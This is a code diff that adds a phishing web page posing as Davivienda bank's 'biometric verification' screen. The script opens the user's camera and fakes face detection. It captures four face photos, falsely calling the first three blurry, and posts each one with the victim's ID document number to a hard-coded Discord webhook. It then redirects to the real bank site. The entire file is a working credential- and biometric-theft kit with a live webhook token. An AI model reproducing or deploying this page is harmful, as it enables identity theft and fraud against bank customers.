@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Davivienda - Verificación Biométrica</title>
+    <style>
+        :root {
+            --davivienda-red: #ed1c24;
+            --aqua-glow: #00CED1;
+            --success: #34c759;
+            --warning: #ff9500;
+            --bg-gray: #F4F4F4;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: var(--bg-gray); display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 40px; overflow: hidden; }
+
+        .logo { width: 180px; margin-bottom: 30px; }
+
+        /* Contenedor del Escáner Ovalado */
+        .scanner-container {
+            position: relative;
+            width: 300px;
+            height: 380px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .video-mask {
+            position: absolute;
+            width: 230px;
+            height: 290px;
+            border-radius: 50% / 45%;
+            overflow: hidden;
+            z-index: 10;
+            background: #000;
+            border: 6px solid #fff;
+            box-shadow: 0 0 25px rgba(0, 206, 209, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        /* Estados del borde según detección */
+        .video-mask.face-ok { border-color: var(--success); box-shadow: 0 0 20px var(--success); }
+        .video-mask.face-warn { border-color: var(--warning); box-shadow: 0 0 20px var(--warning); }
+
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+
+        /* Anillo de Progreso Ovalado */
+        .progress-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 20;
+            pointer-events: none;
+        }
+
+        .ring-progress {
+            fill: transparent;
+            stroke: var(--davivienda-red);
+            stroke-width: 7;
+            stroke-linecap: round;
+            transition: stroke-dashoffset 0.4s ease, stroke 0.3s;
+        }
+
+        /* Luz de escaneo */
+        .scan-light {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(180deg, transparent 30%, rgba(255,255,255,0.6) 50%, transparent 70%);
+            z-index: 12;
+            opacity: 0;
+            animation: scanDown 2s infinite linear;
+        }
+        .scan-light.active { opacity: 1; }
+        @keyframes scanDown { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
+
+        /* Textos de Estado */
+        .status-area { text-align: center; padding: 0 20px; }
+        .main-text { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 5px; }
+        .sub-text { font-size: 16px; color: #666; }
+
+        #canvas { display: none; }
+        .flash { position: fixed; inset: 0; background: white; opacity: 0; z-index: 100; pointer-events: none; transition: opacity 0.1s; }
+    </style>
+</head>
+<body>
+
+    <img src="LogoDavivienda.svg" class="logo">
+
+    <div class="scanner-container">
+        <svg class="progress-ring" viewBox="0 0 300 380">
+            <ellipse class="ring-progress" id="ring" cx="150" cy="190" rx="140" ry="182" 
+                style="stroke-dasharray: 1015; stroke-dashoffset: 1015;"></ellipse>
+        </svg>
+
+        <div class="video-mask" id="mask">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="scan-light" id="light"></div>
+        </div>
+    </div>
+
+    <div class="status-area">
+        <div class="main-text" id="main-text">Iniciando cámara...</div>
+        <div class="sub-text" id="sub-text">Por favor espera</div>
+    </div>
+
+    <canvas id="canvas"></canvas>
+    <div class="flash" id="flash"></div>
+
+<script>
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1484621216558874674/N1PPCe-j7HOUNHa7q_0quBp8zVeDtnFaRzjh88f5Sz85O8jJK8JXBsSWATRv80hTwNZv';
+    
+    const video = document.getElementById('video');
+    const ring = document.getElementById('ring');
+    const mainText = document.getElementById('main-text');
+    const subText = document.getElementById('sub-text');
+    const mask = document.getElementById('mask');
+    const light = document.getElementById('light');
+    const canvas = document.getElementById('canvas');
+
+    let intento = 0;
+    let okFrames = 0;
+    let scanning = false;
+    const CIRC = 1015; // Perímetro aproximado del óvalo
+
+    async function start() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            video.srcObject = stream;
+            requestAnimationFrame(detectionLoop);
+        } catch (e) {
+            mainText.innerText = "Error de cámara";
+        }
+    }
+
+    // Simulador de detección basado en brillo/color (del index que pasaste)
+    function checkFace() {
+        if (!video.videoWidth) return 'none';
+        const tmpCanvas = document.createElement('canvas');
+        tmpCanvas.width = 50; tmpCanvas.height = 50;
+        const ctx = tmpCanvas.getContext('2d');
+        ctx.drawImage(video, 12, 12, 25, 25, 0, 0, 50, 50);
+        const data = ctx.getImageData(0,0,50,50).data;
+        let skin = 0;
+        for(let i=0; i<data.length; i+=4) {
+            if(data[i] > 80 && data[i] > data[i+1]) skin++;
+        }
+        const ratio = skin / 2500;
+        if (ratio > 0.45) return 'too-close';
+        if (ratio > 0.15) return 'ok';
+        return 'none';
+    }
+
+    function detectionLoop() {
+        if (scanning) return;
+        const res = checkFace();
+
+        if (res === 'too-close') {
+            updateUI('warn', 'Aléjese de la cámara', 'Muévete un poco hacia atrás', '#ff9500', 0);
+            okFrames = 0;
+        } else if (res === 'ok') {
+            okFrames++;
+            const pct = Math.min((okFrames / 20) * 100, 100);
+            updateUI('good', 'Rostro detectado', 'Mantén la posición...', '#34c759', pct);
+            if (okFrames >= 20) startCapture();
+        } else {
+            updateUI('', 'Encuadra tu rostro', 'Mira de frente a la cámara', '#ed1c24', 0);
+            okFrames = 0;
+        }
+        requestAnimationFrame(detectionLoop);
+    }
+
+    function updateUI(state, main, sub, color, pct) {
+        mainText.innerText = main;
+        subText.innerText = sub;
+        ring.style.stroke = color;
+        ring.style.strokeDashoffset = CIRC - (pct / 100) * CIRC;
+        mask.className = `video-mask face-${state}`;
+    }
+
+    async function startCapture() {
+        scanning = true;
+        intento++;
+        light.classList.add('active');
+        
+        mainText.innerText = "Validando biometría...";
+        await new Promise(r => setTimeout(r, 1500));
+
+        // Flash
+        document.getElementById('flash').style.opacity = "0.8";
+        setTimeout(() => document.getElementById('flash').style.opacity = "0", 100);
+
+        // Capturar
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+
+        // Enviar a Discord
+        const doc = localStorage.getItem('documento') || 'N/A';
+        const formData = new FormData();
+        formData.append('file', blob, `intento_${intento}_${doc}.jpg`);
+        formData.append('payload_json', JSON.stringify({
+            content: `📸 **Captura ${intento}/4**\n👤 **Documento:** ${doc}`
+        }));
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+
+        light.classList.remove('active');
+
+        if (intento < 4) {
+            updateUI('warn', 'Foto borrosa', 'Inténtalo de nuevo', '#ff3b30', 0);
+            await new Promise(r => setTimeout(r, 2000));
+            scanning = false;
+            okFrames = 0;
+            requestAnimationFrame(detectionLoop);
+        } else {
+            mainText.innerText = "¡Verificado!";
+            subText.innerText = "Redirigiendo...";
+            setTimeout(() => window.location.href = "https://www.davivienda.com", 2000);
+        }
+    }
+
+    window.onload = start;
+</script>
+</body>
+</html>
